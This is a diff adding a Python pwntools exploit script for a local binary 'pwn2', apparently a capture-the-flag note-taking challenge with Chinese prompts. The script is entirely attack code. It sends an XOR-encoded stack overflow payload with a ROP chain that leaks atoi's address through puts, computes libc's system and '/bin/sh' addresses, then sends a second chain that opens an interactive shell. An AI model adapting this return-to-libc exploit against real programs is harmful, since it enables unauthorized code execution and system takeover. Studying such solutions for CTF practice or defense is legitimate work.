@@ -1,0 +1,101 @@
+#!/usr/bin/python 
+# coding:utf-8
+from pwn import *
+
+context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')
+
+def debug(addr = '0x000000000040075D'):
+    	raw_input('debug:')
+    	gdb.attach(io, "b *" + addr)
+
+io = process('./pwn2')
+#debug()
+elf = ELF('./pwn2')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+def add(content):
+	io.recvuntil('4. 退出\n')
+	io.sendline('1')
+	io.recvuntil('输入笔记标题：\n')
+	io.sendline('1234567890asd')
+	io.recvuntil('输入笔记内容：\n')
+	io.sendline(content)
+
+def crypt(nid,method,key):
+	io.recvuntil('4. 退出\n')
+	io.sendline('2')
+	io.recvuntil('输入笔记id:\n')
+	io.sendline(nid)
+	io.recvuntil('3.中强与加密\n')
+	io.sendline(method)
+	io.recvuntil('加密密钥：\n')
+	io.sendline(key)
+
+def quit():
+	io.recvuntil('4. 退出\n')
+	io.sendline('4')
+	#io.recvuntil('使用结束\n')
+#stage1====================================
+atoi_addr = elf.got['atoi']
+put_addr = elf.symbols['puts']
+printf_addr = elf.symbols['__printf_chk']
+main = 0x4006c0
+popret = 0x40075c
+read_addr = elf.plt['read']
+bss_addr = 0x602090
+addesp_24 = 0x400a31
+pop_rdi_ret = 0x400a02
+pop_rsi_pop_r15_ret = 0x400a00
+
+payload = "B"*38+p64(pop_rdi_ret)+p64(atoi_addr)+p64(put_addr)+p64(main)
+#payload += p64(read_addr)+p64(addesp_24)+p64(0)+p64(bss_addr)+p64(0x100)
+
+payload =''.join([chr(1^ord(i)) for i in payload])
+#print payload
+
+add(payload)
+add("a"*100)
+add("a"*100)
+add("a"*100)
+add("a"*100)
+crypt('4','-9','0')
+crypt('1','1','0')
+crypt('0','0','1')
+quit()
+#print len(payload)
+
+leak = u64(io.recv()[13:19].ljust(8,'\x00'))
+print hex(leak)
+
+#stage2====================================
+atoi_libc = libc.symbols['atoi']
+print atoi_libc
+system_libc = libc.symbols['system']
+print system_libc
+binsh_libc = libc.search("/bin/sh").next()
+system_addr = leak - atoi_libc + system_libc
+print system_addr
+binsh_addr = leak - atoi_libc + binsh_libc
+
+#payload2 = "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga"
+payload2 = "B"*38+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)
+
+payload2 =''.join([chr(1^ord(i)) for i in payload2])
+
+io.sendline('1')
+io.recvuntil('输入笔记标题：\n')
+io.sendline('1234567890asd')
+io.recvuntil('输入笔记内容：\n')
+io.sendline(payload2)
+#io.interactive()
+add("a"*100)
+add("a"*100)
+add("a"*100)
+add("a"*100)
+crypt('4','-9','0')
+crypt('1','1','0')
+crypt('0','0','1')
+quit()
+
+io.interactive()
+io.close()
